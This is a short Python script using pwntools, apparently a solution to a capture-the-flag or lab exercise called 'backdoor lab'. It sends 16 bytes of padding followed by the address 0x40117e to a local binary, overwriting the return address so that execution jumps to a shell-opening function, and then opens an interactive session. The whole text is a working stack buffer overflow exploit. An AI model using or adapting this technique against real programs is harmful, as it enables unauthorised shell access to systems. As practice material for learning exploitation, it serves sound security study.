from pwn import *
context.log_level = "debug"
context.arch = "amd64"
p = process("./backdoor")
open_shell = 0x40117e
# stack issue need to jump 0x40117e
payload = b'A' * 8  +b'b' *8 + p64(open_shell)

p.sendafter("Welcome backdoor lab~",payload)
p.interactive()